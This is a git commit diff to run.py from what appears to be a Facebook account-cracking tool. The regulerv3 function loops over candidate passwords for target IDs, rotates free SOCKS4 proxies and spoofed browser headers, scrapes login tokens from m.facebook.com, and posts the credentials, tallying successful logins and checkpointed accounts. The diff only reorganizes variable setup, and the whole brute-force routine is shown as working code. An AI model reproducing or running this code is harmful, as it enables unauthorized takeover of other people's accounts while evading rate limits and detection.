2690c1630a51c7b2cb6420a7f1535d90ce553d01
Viper <106883384+Rudal-XD@users.noreply.github.com>
2023-11-17 08:28:02 +0700

    Update run.py

--- run.py
+++ run.py
@@ -1356,55 +1356,60 @@ def passwrd():
 
 def regulerv3(idf,pwv):
 	global loop,ok,cp
-	rr = random.randint
-	rc = random.choice
+	#rr = random.randint
+	#rc = random.choice
 	prog.update(des,description=f'\r[bold white]Reguler V3[bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{(ok)}[/] [yellow]CP:[yellow]{(cp)}')
 	prog.advance(des)
 	url = "m.facebook.com"
-	ua = random.choice(ugen)
-	ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
-	ses = requests.Session()
+	#ua = random.choice(ugen)
+	#ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
+	#ses = requests.Session()
 	for pw in pwv:
 		pw = pw.lower()
 		try:
 			proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 			nip = rc(proxs)
 			proxs = {'http': 'socks4://'+nip}
+			rr = random.randint
+			rc = random.choice
+			ua = random.choice(ugen)
+			ua2 = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
 			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+			ses = requests.Session()
 			date = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email': idf,'prefill_contact_point': '','prefill_source': '','prefill_type': '','first_prefill_source': '','first_prefill_type': '',
-			'had_cp_prefilled': 'false',
-			'had_password_prefilled': 'false',
-			'is_smart_lock': 'true',
-			'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-			"__dyn": "",
-			"__csr": "",
-			"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
-			"__a": "",
-			"__user": "0",
-			"_fb_noscript": "true"}
+				'had_cp_prefilled': 'false',
+				'had_password_prefilled': 'false',
+				'is_smart_lock': 'true',
+				'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link.text)).group(1),'pass': pw,'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+				"__dyn": "",
+				"__csr": "",
+				"__req": rc(["1","2","3","4","5","6","7","8","9","0"]),
+				"__a": "",
+				"__user": "0",
+				"_fb_noscript": "true"}
 			head = {"Host": url,
-			"content-length": f"{len(str(date))}",
-			"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
-			"sec-ch-ua-mobile": "?1",
-			"user-agent": ua,
-			"viewport-width": f"str(rr(400,989)",
-			"content-type": "application/x-www-form-urlencoded",
-			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
-			"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
-			"x-asbd-id": "129477",
-			"x-requested-with": "mark.via.gp",
-			"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
-			"sec-ch-prefers-color-scheme": "light",
-			"sec-ch-ua-platform": '"Android"',
-			"accept": "*/*",
-			"origin": "https://"+url,
-			"sec-fetch-site": "same-origin",
-			"sec-fetch-mode": "cors",
-			"sec-fetch-dest": "empty",
-			"referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
-			"accept-encoding": "gzip, deflate, br",
-			"accept-language": "zh-CN;q=0.8,zh;q=0.9",
-			"x-response-format": "JSONStream"}
+				"content-length": f"{len(str(date))}",
+				"sec-ch-ua": f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(110,114))}", "Google Chrome";v="{str(rr(110,114))}"',
+				"sec-ch-ua-mobile": "?1",
+				"user-agent": ua,
+				"viewport-width": f"str(rr(400,989)",
+				"content-type": "application/x-www-form-urlencoded",
+				"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+				"sec-ch-ua-platform-version": f'"{str(rr(7,14))}.0.0"',
+				"x-asbd-id": "129477",
+				"x-requested-with": "mark.via.gp",
+				"sec-ch-ua-full-version-list": f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(110,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
+				"sec-ch-prefers-color-scheme": "light",
+				"sec-ch-ua-platform": '"Android"',
+				"accept": "*/*",
+				"origin": "https://"+url,
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-dest": "empty",
+				"referer": f"https://{url}/login.php?skip_api_login=1&api_key=1543146675982943&kid_directed_site=0&app_id=1543146675982943&signed_next=1&next=https%3A%2F%2F{url}%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fapi.clashofstats.com%252Fauth%252Ffacebook%252Fcallback%26scope%3Demail%26client_id%3D1543146675982943%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D13aee46f-34bb-4856-8120-1093c2c7caa0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.clashofstats.com%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "zh-CN;q=0.8,zh;q=0.9",
+				"x-response-format": "JSONStream"}
 			#po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
 			po = ses.post(f"https://{url}/login/device-based/login/async/?refsrc=deprecated&lwv=100",headers=head,data=date,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
